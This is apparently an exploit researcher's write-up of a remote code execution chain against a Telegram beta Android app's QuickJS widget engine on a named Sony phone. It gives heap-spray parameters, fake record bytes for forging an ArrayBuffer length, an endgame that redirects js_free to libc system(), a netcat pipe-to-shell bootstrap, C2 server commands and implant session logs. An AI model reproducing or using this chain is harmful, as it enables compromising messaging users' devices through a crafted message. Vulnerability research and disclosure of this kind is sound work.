# Android cross-tag route (`c2560s`)

This is the first fully device-proven route. It runs on the Sony XQ-BT52 with
MTE **off**. It uses the parser bug to forge an `ArrayBuffer` length, then a
native endgame to call `system()`. The app-level proof is on beta **72929** and
**72889**. On beta **72979** and the current **72989** the engine runs in an
isolated widget process; stage A still works, but the endgame's app-data write
and loopback C2 are contained. See "72979 and 72989 isolated process" below.

## Target

| Item | Value |
|---|---|
| Device | Sony XQ-BT52 (Xperia 10 III), Android 13, build `62.2.A.0.533` |
| Package | `org.telegram.messenger.beta` (13.2.1 / 72889, 13.2.2 / 72929, 72979, 72989) |
| App UID | 10346 (`u0_a346`) on 72889/72929 |
| Widget UID on 72979/72989 | 99017 / 99024, SELinux `u:r:isolated_app:s0` |
| Engine | QuickJS-ng fork snapshot `2dfeee3e` inside `libtmessages.49.so` |
| Widget heap | 6 MiB |
| MTE | off |
| Proof | `/data/user/0/org.telegram.messenger.beta/files/n1` on 72889/72929; blocked on 72979/72989 |

The same widget bytes were run on 72889 (1/1) and 72929 (5/5). The engine and
the struct layout are the same. The app heap layout differs, but the payload
resolves the base, the GOT slot, and `system` at runtime. On 72979 the parser
primitive survives, but the process boundary changes the impact.

## Payload shape

The widget is one HTML file with three script blocks:

```html
<!doctype html><body><div id="v">Ok</div>
<script id="stageA">…</script>
<script id="stageB">…</script>
<script id="stageC">…</script>
```

- **Stage A** (2,228 bytes) triggers the parser bug, sprays fake `JSVarDef`
  records, and forges `T[599].byteLength`.
- **Stage B** (7,182 bytes after minification and padding) is the endgame. It
  scans the view, finds `JSRuntime`, resolves libc, and calls `system`.
- **Stage C** (408 bytes) reads the globals and writes the marker into `#v`.

The three blocks are separate `JS_Eval`s. Stage A ends with `throw` so the
engine moves on to stage B. Stage B sets `MEGA`; stage C reports it.

## Stage A: trigger and forge

The stage-A source is generated by `build_widgets.py` (`stage_a()`). The
parameters are part of the geometry:

| Parameter | Value | Why |
|---|---:|---|
| `fs` | 2,544 | Size of the sprayed `ArrayBuffer` data. The class is 2,560. |
| `nfloat` | 110 | Adds 110 float terms to `f`, so its `JSFunctionBytecode` is larger than 512 bytes and comes from Scudo, not the arena. |
| `nab` | 1,100 | Number of sprayed `ArrayBuffer(2544)` blocks. |
| `drain` | 3,000 | `ArrayBuffer(64)` allocations that drain the class-64 free list. |
| `tn` | 600 | Victim `ArrayBuffer(64)` allocations. `T[598]` is freed. |
| `nsym` | 65,600 | Symbols that keep atom slot 65535 live, so a fake `var_name` in the atom range does not crash `JS_DupAtom`. |
| `keep` | 3,000 | Only the last 3,000 symbols are kept; the rest are freed to reclaim heap. |

The source does this:

1. Creates a large symbol array. The atom table grows past 65,535 entries; the
   last window stays live.
2. Defines `f`:
   ```js
   "use strict";
   function f([] = eval("[]")) { var q1=0, q2=0, q3=0; return 1.5+…+1.5; }
   ```
   The float terms make `b` a large Scudo allocation. The empty pattern and the
   direct eval are the trigger.
3. Builds a 2,544-byte buffer `PB` filled with the 20-byte fake `JSVarDef`
   records:
   ```
   RT = [04 00 00 00 | 05 00 00 00 | 04 00 00 00 | 04 00 00 00 | 04 00 00 00]
   RJ = [04 00 00 00 | 05 00 00 00 | ff ff 00 00 | 04 00 00 00 | 04 00 00 00]
   ```
   The fields are `flags`, `scope_level`, `scope_next`, `var_name` (tagged int
   `4`), `var_ref_idx`. `scope_level = 5` means “captured”; `scope_next = 4`
   walks to the next record; `RJ`'s `scope_next = 0xFFFF` terminates the chain.
4. Allocates 1,100 `ArrayBuffer(2544)` blocks and fills each one with `PB`.
   These are the class-2560 blocks. The +1.31 MB target lands in one of them.
5. Allocates 3,000 `ArrayBuffer(64)` to drain, then 600 more as victims. It
   frees `T[598]` so the victim struct and its neighbour layout are stable.
6. Sweeps phases `ph = 0, 4, 8, 12, 16` and two record orders (`q = 0/1`).
   For each phase it fills every sprayed block with the record grid at offset
   `ph`, calls `f()`, and scans the victims for `byteLength > 1024`.
7. On a hit it creates `V = new Uint8Array(T[i])`, stores `V`, `VAB`, `T` as
   globals, and throws `RESULT ABLEN[i]=327744 VLEN=327744`.

The far read lands at `b->vardefs + 20*(1 + 65534)` = `b + 1,310,828` for the
c2560s geometry. The fake record's `scope_level > 0` makes the engine write
closure entries past the 56-byte closure array. The entry at +64 lands on the
victim `JSArrayBuffer.byte_length` and sets it to `0x00050040 = 327,744`.

The exact value comes from the last normal closure entry (`var_idx = 5`) and
the fake record flags. The important part is that the low 4 bytes become
`0x00050040`; the high 4 bytes (`max_byte_length`) are written by the next
entry.

The probe (`probe-sony-beta-72929.html`) uses the same stage A with an all-4
filler and a `TCHG` check. It reports `S1 SAFE2560C END=-` if the layout is
safe. It never attempts the forge. Run the probe before the final after any
build change.

## Stage B: native endgame

Stage B is `src/endgame-stage-b.js`, minified with terser `-c passes=2 -m`,
then padded with a comment to 7,182 bytes. The builder asserts the exact
length.

It does:

1. Checks `V` and `VAB`. If missing, sets `MEGA = "ERR NOV"` and stops.
2. Scans `V[0, 0x7000)` for a class-24 view object. The class-24 anchor is a
   `Uint8Array` view whose `JSObject` has `u.array.count` in the forged window.
   On 72929 the anchor is at `VO=1360` in one run; on 72889 the runtime anchor
   resolves without a fixed offset.
3. Reads the block header at `VBase-8`, walks to the arena slab, and reads the
   `JSArenaSlab` used-page bitmap (`PG[81]`). Every later read is gated by this
   map, so a wrong anchor stops with `NOANCHOR` instead of crashing.
4. Probes candidate objects in page 0:
   `shape → proto → prop → C_FUNCTION → realm`. `realm` is `JSContext`.
   `ctx+16` is `JSRuntime`.
5. Resolves the app base from the runtime's `PIE` field, then walks the ELF
   dynamic tables (`.rela.plt`, `DT_SYMTAB`, `DT_STRTAB`, GNU hash) to find
   libc `system`. There are no per-build constants for the app base, the
   `free` GOT slot, or `system`.
6. Sets `rt->mf.js_free = system`, writes the command into the runtime's
   opaque field, and frees a trigger buffer. `js_free_rt` calls
   `system(command)`.
7. The command is 50 bytes:
   ```
   id>/data/data/org.telegram.messenger.beta/files/n1
   ```
   It writes the `id` output to the proof file. The app stays alive because
   `system()` runs `sh -c` and returns.

The C2 variant replaces only the 50-byte command with the 44-character
loopback bootstrap:

```
setsid sh -c 'sleep 5|nc 127.0.0.1 5555|sh'&
```

Stage A and stage C are byte-identical. Stage B's script length stays 7,182,
so the probe result at B=7,182 still applies.

## Build

Requirements: Python 3, `node`, and `terser`.

```sh
cd vulns/0day-2-RCE-PARSER-SCOPE/XTAG/payloads
python3 builders/0day-2/xtag/build_widgets.py            # rebuild and verify all six canonical widgets
python3 builders/0day-2/xtag/build_c2_widget.py \
  --src final-sony-beta-72929.html \
  --out /tmp/opencode/c2.html
```

`build_widgets.py` asserts the SHA-256 of every shipped widget. If a file does
not match, the builder reports `PIN-MISMATCH` and exits non-zero. Do not ship a
mismatched payload; the geometry changed.

`build_c2_widget.py` checks that stage A and stage C are byte-identical to the
source final, that the stage-B length stays 7,182, that the command fits 50
bytes, and that the result is under 32,768 / 4,096.

## C2

The C2 widget runs a loopback bootstrap. It is an app-level path: it needs the
widget process to have network permissions. On 72979/72989 the widget runs in
the isolated process, which has no network permissions; the C2 fallback is
blocked there. Use 72929/72889 for the app-level C2 proof, or an
isolated-process escape. Set up `adb reverse` so the phone's `127.0.0.1:5555`
reaches the host loader:

```sh
adb reverse tcp:4444 tcp:4444
adb reverse tcp:5555 tcp:5555

python3 docs/c2/c2560s/server/c2_server.py \
  --host 127.0.0.1 --port 4444 --loader-port 5555 \
  --bootstrap nc --token <TOKEN> \
  --wait-session 180 --cmd sessions --cmd "exec id"
```

The C2 server and implant are in `docs/c2/c2560s/`; the manual is
`docs/c2/c2560s/README.md` and the raw log is
`docs/c2/c2560s/README.md`.
The proof session (2026-11-07 23:52:46):

```
session 1 hello implant=tg-10346-XQ-BT52 uid=10346 user=u0_a346 device=XQ-BT52 from=127.0.0.1
uid=10346(u0_a346) ... context=u:r:untrusted_app:s0:c90,c257,c512,c768
[exec rc=0 0.52s]
```

The loader served 39,803 bytes. `setsid` keeps the pipeline alive after
`system()` returns. The implant survives an app crash but not `am force-stop`
or a reboot.

A dedicated timing run on 2026-11-08 measured **1.913 s from message open to
the C2 `hello`**: 459 ms to the widget sandbox task, 339 ms to the first
`system()` fork, 100 ms to the loader accept, 1,016 ms to the hello. The
`exec id` output followed at 3.163 s. This is one measured run, not a
distribution.

## 72979 and 72989 isolated process

The beta updated to versionCode **72979** (versionName 13.2.2, update
2026-11-08 18:43:58; previous 72929), then to **72989** (update 18:57:37;
previous 72979). The app stayed alive. The widget engine moved from the app
process to:

```
org.telegram.messenger.beta:widgets:org.telegram.utils.twidget.WidgetEngineService
UID 99017 on 72979; UID 99024 on 72989
SELinux u:r:isolated_app:s0
```

The app UID is still 10346. Functional checks passed: a normal
`TelegramWidget.request('PING')` reached the host (`SKIP data 'PING'`), and
the v3 detector reported `platform=1 chain=1 hit=1 att=0 sel=599 dpr=2.6
scr=389x300 el=54ms`.

The parser is not fixed. The v3 parser plus c2560s final hit stage A:

```
ABLEN[599]=327744 ATT=1
HF ERR NOANCHOR VNC=0 VO=-1
```

There was no `n1`, and the app stayed alive. The endgame failure is the same
anchor limitation seen on 72929, not an update regression.

On the current **72989** the same isolated service runs at UID **99024**.
`PING` reached the host; the v3 detector reported `el=55ms`; the v3 final was
9,190 B / 4,081 zlib9; the app stayed alive, no crash; the endgame is the same
`HF ERR NOANCHOR`; no `n1`/C2. Test messages were deleted and no poller was
active.

Impact: the isolated process has no app-private data access and no network
permissions. The stage-B `system("id>.../n1")` write and the loopback C2 are
blocked there even if the anchor is fixed. On 72979/72989 this is contained
code execution or DoS in the widget process, not app-level RCE. App-level
Android impact requires 72929/72889 or an isolated-process escape.

## Limits

- **MTE must be off.** The vulnerable bytecode is a Scudo large block. Under
  MTE its tag differs from the sprayed target. The first fake `JSVarDef` load
  faults with `SEGV_MTESERR`.
- **No per-build constants.** The endgame resolves the app base, the `free`
  GOT slot, and libc `system` at runtime. The stage-B length and the stage-A
  harness length are fixed, but they are not Telegram build values.
- **Heap sensitivity.** The phase/order sweep exists because the target block
  is chosen by allocation order. A wrong phase is a safe `NOCORR` or a crash in
  the fake-record load; it is not silent corruption.
- **Proof size.** The command field is 50 bytes. The proof is the `id` line.
  There is no room for `MEGARCE` or a longer marker.
- **App-level only on 72889/72929.** The proof is app UID code execution; no
  root, no kernel, no persistence across `force-stop`.
- **72979/72989 are contained.** The isolated widget process has no app-private
  data or network permissions. Stage A still works; the app-data proof and C2
  do not. Do not present 72979/72989 as app-level RCE.

## Next

The `fallback-4096` family is host-only. It exists for a build where the
class-2560 allocation is not available. Do not run it on a device before the
probe is safe and the host proof passes.

For 72979/72989, the next step is not another app-data payload. It is to
characterize what the isolated UID can do and whether a separate isolated-process
escape exists. The parser stage A is already demonstrated there.
